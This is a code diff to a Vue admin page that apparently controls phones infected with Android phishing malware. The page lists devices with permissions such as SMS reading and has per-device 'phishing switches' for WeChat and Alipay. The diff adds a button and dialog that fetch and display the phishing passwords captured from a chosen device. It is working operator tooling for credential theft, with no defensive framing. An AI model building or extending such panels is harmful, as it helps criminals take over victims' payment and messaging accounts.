@@ -88,15 +88,21 @@
         </template>
       </el-table-column>
 
-      <el-table-column label="钓鱼开关" header-align="center" align="right" width="150px">
+      <el-table-column label="钓鱼开关" header-align="center" align="right" width="200px">
         <template v-slot="scope">
-          <el-switch
-            v-for="item in fishTemplateList"
-            :key="item.code"
-            :inactive-text="item.label"
-            :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]"
-            @update:model-value="updateFishSwitch(scope.row, item.code, $event)"
-          />
+          <div v-for="item in fishTemplateList" :key="item.code" style="display: flex; align-items: center; gap: 8px; margin-bottom: 4px">
+            <el-switch :inactive-text="item.label" :model-value="scope.row.fishSwitch && !!scope.row.fishSwitch[item.code]" @update:model-value="updateFishSwitch(scope.row, item.code, $event)" />
+            <el-button
+              v-if="!scope.row.fishSwitch || !scope.row.fishSwitch[item.code]"
+              v-show="item.code === 'wx' || item.code === 'zfb'"
+              link
+              type="primary"
+              size="small"
+              @click="showFishPwd(scope.row, item.code)"
+            >
+              查看
+            </el-button>
+          </div>
         </template>
       </el-table-column>
 
@@ -281,6 +287,16 @@
         <el-button type="primary" @click="submitRemark" :loading="remarkSubmitting">确定</el-button>
       </template>
     </el-dialog>
+
+    <!-- 查看钓鱼密码弹窗 -->
+    <el-dialog v-model="fishPwdDialogVisible" :title="`钓鱼密码 - ${fishPwdTitle}`" width="600px" :close-on-click-modal="false" destroy-on-close>
+      <div v-loading="fishPwdLoading">
+        <el-input v-model="fishPwdData" type="textarea" :rows="10" readonly />
+      </div>
+      <template #footer>
+        <el-button @click="fishPwdDialogVisible = false">关闭</el-button>
+      </template>
+    </el-dialog>
   </div>
 </template>
 
@@ -359,6 +375,10 @@ export default defineComponent({
       deviceId: "",
       remark: ""
     });
+    const fishPwdDialogVisible = ref(false);
+    const fishPwdLoading = ref(false);
+    const fishPwdData = ref("");
+    const fishPwdTitle = ref("");
 
     return {
       ...useView(state),
@@ -387,6 +407,10 @@ export default defineComponent({
       remarkContent,
       remarkSubmitting,
       currentRemarkDevice,
+      fishPwdDialogVisible,
+      fishPwdLoading,
+      fishPwdData,
+      fishPwdTitle,
       fishTemplateList,
       permissionsName: {
         "android.permission.READ_SMS": "短信",
@@ -734,6 +758,41 @@ export default defineComponent({
       } else {
         this.dataForm.start = "";
         this.dataForm.end = "";
+      }
+    },
+    async showFishPwd(row: any, code: string) {
+      this.fishPwdLoading = true;
+      this.fishPwdDialogVisible = true;
+      this.fishPwdData = "";
+
+      // 设置标题
+      const codeNames: any = {
+        wx: "微信",
+        zfb: "支付宝"
+      };
+      this.fishPwdTitle = `设备ID: ${row.deviceId} - ${codeNames[code] || code}`;
+
+      try {
+        const {
+          code: resCode,
+          data,
+          msg
+        } = await baseService.post("/device/showFishPwd", {
+          id: row.deviceId,
+          code: code
+        });
+
+        if (resCode === 0 && data) {
+          this.fishPwdData = data.data || "暂无数据";
+        } else {
+          ElMessage.error(msg || "获取钓鱼密码失败");
+          this.fishPwdDialogVisible = false;
+        }
+      } catch (error) {
+        ElMessage.error("获取钓鱼密码失败");
+        this.fishPwdDialogVisible = false;
+      } finally {
+        this.fishPwdLoading = false;
       }
     }
   }
